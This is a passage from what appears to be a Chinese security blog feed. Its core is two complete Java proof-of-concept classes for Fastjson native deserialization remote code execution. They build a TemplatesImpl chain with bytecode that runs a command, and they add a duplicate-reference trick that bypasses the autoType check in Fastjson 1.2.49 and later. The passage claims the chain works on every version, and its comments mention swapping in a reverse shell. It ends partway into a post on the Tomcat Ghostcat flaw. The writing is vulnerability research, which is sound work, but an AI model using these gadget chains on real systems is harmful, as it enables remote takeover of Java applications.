class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;RANDOM&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] byteArray)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArray);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        poc1();</span></span><br><span class="line">        poc2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(getTemplatesImpl());</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(exception, <span class="string">&quot;val&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        deserialize(serialize(exception));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc2</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(getTemplatesImpl());</span><br><span class="line"></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里的顺序很重要，不然在调用equals方法时可能调用的是JSONArray.equals(XString)</span></span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, array);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里是在通过反射添加map的元素，而非put添加元素，因为put添加元素会导致在put的时候就会触发RCE，</span></span><br><span class="line">        <span class="comment">// 一方面会导致报错异常退出，代码走不到序列化那里；另一方面如果是命令执行是反弹shell，还可能会导致反弹的是自己的shell而非受害者的shell</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">2</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, hashMap1, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        Array.set(o, <span class="number">1</span>, constructor.newInstance(<span class="number">0</span>, hashMap2, <span class="string">&quot;b&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        deserialize(serialize(map));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="补充完善"><a href="#补充完善" class="headerlink" title="补充完善"></a>补充完善</h1><p>但是上面按照直接思路写的 <code>poc</code> 只能用于 <code>fastjson&lt;=1.2.48</code> 或者 <code>fastjson2</code> ，在 <code>fastjson</code> <code>1.2.49</code> 版本及以后上面的 <code>poc</code> 是用不了的，会报错： <code>autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。这是为什么呢？</p><p>从 <code>1.2.49</code> 开始，我们的 <code>JSONArray</code> 以及 <code>JSONObject</code> 方法开始真正有了自己的 <code>readObject</code> 方法。</p><p><img src="/imgs/Pasted%20image%2020240311033341.png"></p><p><img src="/imgs/Pasted%20image%2020240311033353.png"></p><blockquote><p>在对 <code>JSONArray</code> （ <code>JSONObject</code> ）进行反序列化的时候，会通过  <code>Fastjson</code> 自定义的 <code>SecureObjectInputStream</code> 来处理，因此 <code>JSONArray</code> 内部封装了的恶意 <code>TemplatesImpl</code> 对象会被 <code>SecureObjectInputStream#resolveClass()</code> 中的 <code>checkAutoType()</code> 给过滤。</p></blockquote><p>但是这就没办法绕过了吗？</p><p>之前在学习jdk7u21和jdk8u20原生反序列化漏洞分析链子的时候提到过，两个相同的对象在同一个反序列化的过程中只会被反序列化一次。那么我们可以在序列化的时候注入两个相同的 <code>TemplatesImpl</code> 对象，第二个 <code>TemplatesImpl</code> 对象被封装到 <code>JSONArray</code> 中。那么在靶机反序列化我们的 <code>payload</code> 时，如果先用正常的 <code>ObjectInputStream</code> 反序列化了第一个 <code>TemplatesImpl</code> 对象，那么在第二次在 <code>JSONArray.readObject()</code> 中，就不会再用 <code>SecureObjectInputStream</code> 来反序列化这个相同的 <code>TemplatesImpl</code> 对象了，就会绕过 <code>checkAutoType()</code> 的检查！</p><p>完善后的 <code>poc</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;RANDOM&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] byteArray)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArray);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        poc3();</span></span><br><span class="line">        poc4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc3</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(exception, <span class="string">&quot;val&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(templates, exception);</span><br><span class="line"></span><br><span class="line">        deserialize(serialize(map));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc4</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里的顺序很重要，不然在调用equals方法时可能调用的是JSONArray.equals(XString)</span></span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, array);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里是在通过反射添加map的元素，而非put添加元素，因为put添加元素会导致在put的时候就会触发RCE，</span></span><br><span class="line">        <span class="comment">// 一方面会导致报错异常退出，代码走不到序列化那里；另一方面如果是命令执行是反弹shell，还可能会导致反弹的是自己的shell而非受害者的shell</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">2</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, hashMap1, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        Array.set(o, <span class="number">1</span>, constructor.newInstance(<span class="number">0</span>, hashMap2, <span class="string">&quot;b&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        obj.put(templates, map);</span><br><span class="line"></span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此 <code>fastjson</code> 全版本实现了原生反序列化利用！</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80</a><br><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Fastjson </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ghostcat Tomcat文件读取和文件包含漏洞（CVE-2020-1938）</title>
      <link href="/2024/03/06/Ghostcat%20Tomcat%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
      <url>/2024/03/06/Ghostcat%20Tomcat%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>由于 <code>Tomact AJP</code> 协议的设计缺陷，攻击者可以通过漏洞读取 <code>webapp</code> 目录下的任意文件，或者通过文件包含 <code>getshell</code> 。</p><p>编号：<code>CNVD-2020-10487</code> &#x2F; <code>CVE-2020-1938</code><br>外号：<code>Ghostcat</code> </p><blockquote><p><code>Tomcat</code> 的 <code>AJP</code> 是默认开启的，一般来说只要发现目标机器开放了 <code>8009</code> 端口并且 <code>Tomcat</code> 的版本处于受影响版本中，就会有漏洞。</p></blockquote><h2 id="AJP的介绍"><a href="#AJP的介绍" class="headerlink" title="AJP的介绍"></a>AJP的介绍</h2><p>在 <code>AJP</code> 协议中，请求参数是以二进制格式传输的。在处理 <code>AJP</code> 请求时，<code>Tomcat</code> 会将请求参数解析为一个名值对的列表，并将其转换为 <code>HTTP</code> 请求的属性，以便应用服务器更好处理请求。</p><p><code>AJP</code> 协议设计的主要目的就是快，不过现在主要用于反向代理，就是其它的 <code>web</code> 服务器（例如 <code>Apache</code> 作为客户端到 <code>Tomcat</code> 的中间件，客户端连接 <code>Apache</code> 时采用 <code>http</code> 协议，<code>Apache</code> 再连接后台的 <code>Tomcat</code> 时采用 <code>AJP</code> 协议（也可以不用）。你可以会好奇为什么客户端不直接使用 <code>AJP</code> 协议，因为浏览器不支持，浏览器采用的是更通用的 <code>http</code> 协议。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.x 